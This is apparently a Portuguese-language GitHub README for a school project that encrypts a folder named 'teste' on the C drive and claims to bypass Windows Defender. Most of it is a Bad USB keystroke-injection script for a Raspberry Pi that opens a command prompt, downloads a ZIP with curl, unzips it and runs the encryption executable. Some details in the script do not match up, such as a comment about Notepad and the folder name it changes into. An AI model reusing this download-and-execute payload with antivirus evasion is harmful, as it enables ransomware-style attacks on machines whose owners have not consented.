# CifrarPastaTrabalhoEscola
Trabalho escola para cifrar uma pasta


rapysberry pi bad usb encrpyt a folder
PROJETO DESENVOLVIDO POR PEQSPC
PROJETO DE ESCOLA PARA CIFRAR UMA PASTA que da bypass ao windows defender

este PROJETO VAI CIFRAR UMA PASTA NO DISCO C CHAMADA DE TESTE 
Por isso se quiseres testar este projeto tens que criar uma pasta no disco c e meter o nome de teste 
e adicionar alguns ficheiros la dentro



CONTINUACAO DO PROJETO E FAZER DOWNLOAD DO FICHEIRO NO GITHUB A USAR UMA BADUSB PARA ELA FAZER O DOWNLOAD E EXECUTAR E CIFRAR UMA PASTA NO PC



REM Inicia o Notepad
DELAY 1000
GUI r
DELAY 1000
REM Abre a janela de comando
STRING cmd
ENTER
DELAY 1000
REM Vai para a pasta de downloads
STRING cd downloads
ENTER
DELAY 1000
REM Faz o download do arquivo ZIP
STRING curl -LJO https://github.com/PEQSPC/CifrarPastaTrabalhoEscola/archive/refs/heads/main.zip
ENTER
DELAY 5000
REM Descompacta o arquivo ZIP
STRING unzip CifrarPastaTrabalhoEscola-main.zip
ENTER
DELAY 1000
REM Vai para a pasta descompactada
STRING cd repo-master
ENTER
DELAY 1000
REM Executa o arquivo dentro da pasta
STRING cifrarumapasta.exe
ENTER
